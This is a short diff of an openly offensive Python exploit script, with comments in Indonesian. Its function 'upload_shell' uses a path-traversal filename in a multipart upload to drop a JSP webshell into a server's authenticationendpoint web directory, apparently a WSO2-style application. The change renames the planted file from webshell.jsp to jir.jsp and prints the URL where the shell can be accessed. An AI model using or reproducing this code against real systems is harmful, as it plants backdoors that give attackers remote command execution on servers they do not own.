@@ -35,7 +35,7 @@ def upload_shell(target_url, shell_filename):
 
     # Data form untuk upload file
     files = {
-        "../../../../repository/deployment/server/webapps/authenticationendpoint/webshell.jsp": (shell_filename, webshell_content, 'application/octet-stream')
+        "../../../../repository/deployment/server/webapps/authenticationendpoint/jir.jsp": (shell_filename, webshell_content, 'application/octet-stream')
     }
 
     try:
@@ -44,7 +44,7 @@ def upload_shell(target_url, shell_filename):
         
         # Menampilkan hasil request
         if response.status_code == 200:
-            shell_url = f"{target_url}/authenticationendpoint/webshell.jsp"
+            shell_url = f"{target_url}/authenticationendpoint/jir.jsp"
             print(f"[+] Webshell berhasil diunggah!")
             print(f"[+] Akses shell di: {shell_url}")
         else:
